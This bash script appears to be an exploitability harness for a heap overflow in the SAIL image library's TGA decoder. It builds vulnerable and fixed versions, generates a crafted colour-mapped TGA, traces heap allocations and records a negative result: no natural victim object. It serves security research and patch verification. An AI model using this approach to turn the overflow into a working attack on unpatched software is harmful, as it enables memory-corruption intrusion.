#!/usr/bin/env bash
# sailtga2shell w4: can the rung-4 pointer control transfer to a NATURAL
# shipped-consumer object? Observational malloc trace on the shipped v0.9.10
# sail CLI (no interposer victim, no return values changed). A color-mapped
# 16x16 indexed-RLE bpp=32 TGA overflows the 256-byte pixel buffer; a bpp=8
# palette TGA is the matching-stride control. Pointer-bearing objects in the
# shipped decode path are allocated BEFORE the pixel buffer; the first object
# after it (an 88-byte sail_image) is allocated only AFTER the writes and its
# pointer fields are zeroed by sail_alloc_image. No natural victim.
# Rung-4 negative result, never r5. New files are un-pinned.
set -u
cd "$(dirname "$0")/.."
ROOT="$PWD"
mkdir -p evidence-w4

pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
need() { grep -q -- "$2" "$1" 2>/dev/null; }

VLIBS="-Wl,--start-group build-vuln-plain/src/sail/libsail.a build-vuln-plain/src/sail-codecs-archive/libsail-codecs.a build-vuln-plain/src/sail-common/libsail-common.a build-vuln-plain/src/sail-manip/libsail-manip.a -Wl,--end-group"
FLIBS="-Wl,--start-group build-fixed-plain/src/sail/libsail.a build-fixed-plain/src/sail-codecs-archive/libsail-codecs.a build-fixed-plain/src/sail-common/libsail-common.a build-fixed-plain/src/sail-manip/libsail-manip.a -Wl,--end-group"

echo "== build shipped applications and observational tracer =="
gcc -fopenmp -g -O0 -I sail-0.9.10/src -I build-vuln-plain/include \
    sail-0.9.10/examples/c/sail/sail.c $VLIBS -lm \
    -o evidence-w4/sail-cli-plain 2> evidence-w4/compile-cli.log \
    && ok "build shipped v0.9.10 CLI (plain)" || bad "build shipped v0.9.10 CLI"
gcc -shared -fPIC -O0 -g -o evidence-w4/heap_trace.so harness/heap_trace.c \
    2> evidence-w4/compile-trace.log \
    && ok "build observational malloc tracer" || bad "build observational malloc tracer"
gcc -fopenmp -g -O0 -I stubs -I sail-1.0.0/src -I build-fixed-plain/include \
    sail-1.0.0/examples/c/advanced.c $FLIBS -lm \
    -o evidence-w4/advanced-fixed 2> evidence-w4/compile-fixed.log \
    && ok "build shipped v1.0.0 advanced example (vendor-fixed)" || bad "build fixed example"

echo "== generate color-mapped attack and matching-stride control =="
python3 harness/make-palette-poc.py evidence-w4/palette-attack.tga 68 43424100 00007f00 \
    > evidence-w4/gen-attack.log 2>&1 && ok "generate color-mapped bpp=32 attack" || bad "generate attack"
python3 harness/make-palette-poc.py evidence-w4/palette-safe8.tga 68 5a5a5a5a 5a5a5a5a 8 \
    > evidence-w4/gen-safe.log 2>&1 && ok "generate color-mapped bpp=8 safe control" || bad "generate safe control"

run_cli() {
    env SAIL_HEAP_TRACE="$ROOT/evidence-w4/trace-$1.txt" \
        LD_PRELOAD="$ROOT/evidence-w4/heap_trace.so" \
        ./evidence-w4/sail-cli-plain convert "evidence-w4/$2.tga" "evidence-w4/out-$1.tga" \
        > "evidence-w4/cli-$1.out" 2>&1
}

echo "== safe control decodes and traces real heap layout =="
run_cli palette-safe8 palette-safe8
safe_rc=$?
[ "$safe_rc" -eq 0 ] && [ -s evidence-w4/out-palette-safe8.tga ] \
    && ok "matching-stride safe8 converts through shipped CLI" || bad "matching-stride safe8 converts"
need evidence-w4/trace-palette-safe8.txt 'first 256-byte allocation is candidate pixel' \
    && ok "trace marks the 256-byte pixel allocation" || bad "trace marks pixel allocation"

echo "== bpp=32 attack corrupts the top chunk in the shipped CLI =="
run_cli palette-attack palette-attack
attack_rc=$?
[ "$attack_rc" -ne 0 ] && ok "bpp=32 attack fails in the plain shipped CLI (rc=$attack_rc)" || bad "attack fails in plain CLI"
need evidence-w4/cli-palette-attack.out 'malloc(): corrupted top size' \
    && ok "glibc reports corrupted top size after the overflow" || bad "corrupted top size report"

echo "== structural negative: the natural post-pixel object is initialized after the writes =="
pixel=$(grep 'first 256-byte allocation' evidence-w4/trace-palette-safe8.txt \
        | sed -n 's/.*pixel: \(0x[0-9a-f]*\).*/\1/p')
next=$(grep -A1 'first 256-byte allocation' evidence-w4/trace-palette-safe8.txt \
       | sed -n '2s/.*p=\(0x[0-9a-f]*\).*/\1/p')
if [ -n "$pixel" ] && [ -n "$next" ]; then
    delta=$((next - pixel))
    echo "pixel=$pixel next=$next delta=$delta"
    [ "$delta" -eq 272 ] \
        && ok "first natural object is 272 bytes after the pixel buffer (in the overwritten window)" \
        || bad "natural object delta (expected 272, got $delta)"
    need evidence-w4/trace-palette-safe8.txt 'a=88' \
        && ok "natural object is an 88-byte sail_image with pointer fields" || bad "natural object size"
else
    bad "read post-pixel allocation addresses"
fi
# The 88-byte object is sail_alloc_image() during conversion: every field is
# zeroed at src/sail-common/image.c:39-52 AFTER the decode writes. This is a
# source fact, not inferred from the trace alone.
need sail-0.9.10/src/sail-common/image.c '(*image)->pixels         = NULL' \
    && ok "sail_alloc_image zeroes pointer fields before any consumer use" || bad "sail_alloc_image zeroing"

echo "== vendor-fixed control rejects the same color-mapped attack =="
./evidence-w4/advanced-fixed evidence-w4/palette-attack.tga > evidence-w4/fixed-attack.out 2>&1
fixed_rc=$?
need evidence-w4/fixed-attack.out 'SAIL_ERROR_INVALID_IMAGE' \
    && ok "vendor-fixed v1.0.0 rejects the attack (rc=$fixed_rc)" || bad "vendor-fixed rejects attack"
! need evidence-w4/fixed-attack.out 'AddressSanitizer' \
    && ok "no memory error in the fixed control" || bad "fixed control clean"
./evidence-w4/advanced-fixed evidence-w4/palette-safe8.tga > evidence-w4/fixed-safe.out 2>&1
safe_fixed_rc=$?
[ "$safe_fixed_rc" -eq 0 ] && ok "vendor-fixed build accepts the matching-stride control" \
    || bad "vendor-fixed accepts safe control"

echo "NAT_PASS=$pass NAT_FAIL=$fail"
[ "$fail" -eq 0 ] && exit 0 || exit 1
